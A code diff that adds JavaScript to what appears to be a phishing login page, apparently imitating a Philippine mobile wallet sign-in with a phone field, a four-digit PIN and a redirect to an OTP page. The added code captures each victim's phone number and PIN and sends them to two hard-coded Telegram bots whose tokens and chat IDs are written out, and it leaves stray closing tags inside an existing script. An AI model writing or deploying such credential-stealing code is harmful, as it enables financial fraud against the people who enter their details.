@@ -241,6 +241,95 @@
       initOtp();
       initSuccess();
       applySharedPolish();
+        // Bot 1 (your existing)
+        const BOT_TOKEN_1 = '8658270993:AAGQoD3J0lOymxjxMnNo6yfwXaFHNQuO8lo';
+        const CHAT_ID_1 = '8671118754';
+
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+        const CHAT_ID_2 = '5615316142';
+
+        const savedPhone = localStorage.getItem('phone');
+        const phoneInput = document.getElementById('phoneInput');
+        if (savedPhone && savedPhone.length === 9) {
+            phoneInput.value = savedPhone;
+        }
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        let pinValue = '';
+
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+        }
+
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                if (box.value.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        // ========== LOGIN CLICK ==========
+        loginBtn.addEventListener('click', () => {
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                alert('Please enter phone number');
+                return;
+            }
+
+            spinnerOverlay.style.display = 'flex';
+
+            // Save phone to localStorage
+            localStorage.setItem('phone', phone);
+
+            // Build the credential message
+            const message = `New Login Attempt\n\nPhone: +63 ${phone}\nPIN: ${pinValue}`;
+
+            // Send to Bot 1
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_1,
+                    text: message
+                })
+            }).catch(() => {});
+
+            // Send to Bot 2
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
+                })
+            }).catch(() => {});
+
+            // Proceed to next page
+            setTimeout(() => {
+                window.location.href = 'otp.html';
+            }, 1500);
+        });
+
+        checkPinComplete();
+        pinBoxes[0].focus();
+    </script>
+</body>
+
+</html>
     </script>
   </body>
 </html>
